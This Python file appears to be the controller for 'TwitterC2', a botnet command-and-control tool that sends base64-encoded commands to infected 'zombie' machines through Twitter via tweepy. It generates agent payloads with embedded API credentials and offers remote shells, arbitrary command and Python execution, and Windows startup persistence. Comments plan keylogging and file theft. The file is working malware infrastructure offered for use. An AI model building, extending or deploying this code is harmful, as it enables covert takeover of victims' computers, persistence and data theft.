import tweepy
import base64
import ast
import os

from twitterc2 import pcos

global username, messages, pause, newMsg

path = os.path.dirname(os.path.abspath(__file__))

if pcos == "win":
        keystxt = path+"\\keys.txt"
        tpath = path+"\\templates"
        agent_tplate = tpath+"\\agent.py"
        tkeys = tpath+"\\keys.txt"
        slash = "\\"
elif pcos == "lin":
        keystxt = path+"/keys.txt"
        tpath = path+"/templates"
        agent_tplate = tpath+"/agent.py"
        tkeys = tpath+"/keys.txt"
        slash = "/"

def get_keys():
        with open(keystxt,"r") as keyfile:
                keys = [line.rstrip('\n') for line in keyfile]
                c1, c2, a1, a2, user, agent = '', '', '', '','', ''
                for key in keys:
                        key = key.split("=")[1]
                        if c1 == '':
                                c1 = key
                        elif c2 == '':
                                c2 = key
                        elif a1 == '':
                                a1 = key
                        elif a2 == '':
                                a2 = key
                        elif user == '':
                                user = key
                        elif agent == '':
                                agent = key
                                return c1, c2, a1, a2, user, agent


def format_msg(_from,to,command,result,refresh):
        if not command == False:
                cmd = format_cmd(command["type"],command["cmd"],command["get_result"],command["background"])
        else: cmd = False
        json = {"from":_from, "to":to, "command":cmd, "result":result, "refresh":refresh}
        encoded = base64.b64encode(str(json).encode()).decode()
        encoded = "$c2$"+encoded+"$c2$"
        return encoded
def unformat_msg(msg):
        try:
                text = base64.b64decode(msg.encode()).decode()
                data = ast.literal_eval(text)
                if data["command"]:
                        data["command"] = unformat_cmd(data["command"])
                return data
        except Exception as e:
                print("[Error: %s]\nText:\n%s" % (str(e),msg))
def format_cmd(_type,cmd,get_result,background):
        data = {"type":_type, "cmd":cmd, "get_result":get_result, "background":background}
        encoded = base64.b64encode(str(data).encode()).decode()
        return encoded
def unformat_cmd(data):
                text = base64.b64decode(data.encode()).decode()
                if not text == False:
                        data = ast.literal_eval(text)
                else: data = False
                return data
        
def gen_payload():
        payload = ''
        keystuff = {"c1":False,"c2":False,"a1":False,"a2":False,"au":False,"su":False}
        try:
                with open(tkeys,"r") as keyfile:
                        lines = keyfile.read().split("\n")
                        keystuff["c1"] = lines[0]
                        keystuff["c2"] = lines[1]
                        keystuff["a1"] = lines[2]
                        keystuff["a2"] = lines[3]
                        keystuff["au"] = lines[4]
                        keystuff["su"] = lines[5]
                template = ''
                tplate = open(agent_tplate,"r").read()
                payload += ('''
global consumer_key,consumer_secret,access_token,access_secret,agent_user,server_name
consumer_key = '%s'
consumer_secret = "%s"
access_token = "%s"
access_secret = "%s"
agent_user = "%s"
server_name = "%s"
''' % (keystuff["c1"],keystuff["c2"],keystuff["a1"],keystuff["a2"],keystuff["au"],keystuff["su"]))
                payload += tplate
                filename = input("Enter filename to save payload to (with path): ")
                with open(filename,"w") as out_file:
                        out_file.write(payload)
                print("[*] Successfully generated payload to [%s]" % (path+"\\"+filename))
        except Exception as e: print("[Error]: "+str(e))


error_noZombie = "[!] Error, no zombie selected"
error_noArgs = "[!] Argument(s) required"
error_noCmd = "[!] Not a valid command"


mainmenu = '''
--------------------------------------------------
|                  -TwitterC2-                   |
--------------------------------------------------
| Commands:                                      |
| exit - exits program                           |
| help - prints this                             |
| clear - clears the screen                      |
| genPayload - generate a payload                |
| polling [secs] - change server polling         |
| lshell - drop into a local shell               |
| list - lists zombies                           |
| refresh - refresh bots                         |
| use [id/all] - choose zombie to use            |
|                                                |
| ping - check current zombie is alive           |
| zombiePolling [secs] - change polling time of  |
|                        current zombie(s)       |
| shell - interactive shell with zombie          |
| cmd [cmd] - send command to selected zombie(s) |
| py [cmd] - send (blind) python code to         |
|            selected zombie(s)                  |
| persist - add payload to startup folder        |
|           (Windows only!)                      |
--------------------------------------------------
'''

'''
from, to, command(type, cmd, get_result, background), result, refresh

Commands to add:
disinfect - remove persistance from zombie [multiple]
deleteMessages - delete all messages [require confirm]
man [cmd] - print detailed help for cmd
migrate - migrate bot(s) to different account [multiple, require confirm]
send [localfile] [filename] - send file to zombie [single]
recv [filename] [localfile] - recieve file from zombie [single]
keylogger [start/stop] - start/stop keylogger [multiple]
stop [id/all] - stops the agent payload (send python "exit(0)")
'''
